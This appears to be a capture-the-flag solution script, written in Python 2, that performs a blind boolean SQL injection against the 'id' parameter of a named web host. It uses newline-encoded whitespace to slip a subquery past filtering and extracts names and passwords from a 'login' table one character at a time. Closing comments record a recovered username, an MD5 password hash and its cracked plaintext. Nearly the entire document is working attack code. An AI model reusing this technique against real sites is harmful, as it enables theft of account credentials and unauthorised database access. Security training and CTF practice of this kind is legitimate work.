import requests

url = "http://naughtyads.alieni.se/"

session = requests.Session()

output = ""

for i in range(1,33):
    for j in range(32,127):
        
 #       query = "?id=0c3f-42c8-a0a'|if(%0asubstring((%0aselect group_concat(name) from login),{0},1)=%0abinary 
'{1}','e','2')|'".format(int(i),chr(j))
        query = "?id=0c3f-42c8-a0a'|if(%0asubstring((%0aselect group_concat(password) from login),{0},1)=%0abinary 
'{1}','e','2')|'".format(int(i),chr(j))
        s = session.get(url+query)
        if "Looking" in s.content:
            output += chr(j)
            print output
            break;

#username --> webmasterofdoom3755
#password -- 5ebe2294ecd0e0f08eab7690d2a6ee69 --> secret
